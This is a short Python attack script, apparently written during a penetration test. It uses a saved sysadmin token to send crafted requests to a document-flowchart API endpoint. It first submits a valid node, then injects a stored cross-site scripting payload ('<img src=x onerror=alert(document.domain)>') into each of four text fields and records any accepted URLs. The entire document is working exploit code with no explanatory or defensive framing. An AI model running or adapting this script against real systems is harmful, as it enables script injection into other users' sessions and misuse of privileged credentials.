import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def req(body):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/documents/flowchart',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXF'+uuid.uuid4().hex[:5]
def node(**kw):
    n={"id":"1","description":f"ZX{tag}","nextStep":[],"connectorLabel":[],
       "shapeType":"Process","function":"","phase":"","altText":""}
    n.update(kw); return n
print("=== valid node ===")
c,b=req([node()])
print(f"  -> {c} {b[:250].replace(chr(10),' ')}")
if c=='200':
    d=json.loads(b); print(f"  *** ACCEPTED url={d.get('url','')[:110]}")
    open('/tmp/flow_url','w').write(d.get('url',''))
print()
print("=== inject into each text field ===")
pay=f'<img src=x onerror=alert(document.domain)>{tag}'
for field in ['description','altText','function','phase']:
    c,b=req([node(**{field:pay})])
    print(f"  {field:10} -> {c} {b[:150].replace(chr(10),' ')}")
    if c=='200':
        d=json.loads(b)
        print(f"     *** ACCEPTED url={d.get('url','')[:90]}")
        open(f'/tmp/flow_{field}','w').write(d.get('url',''))
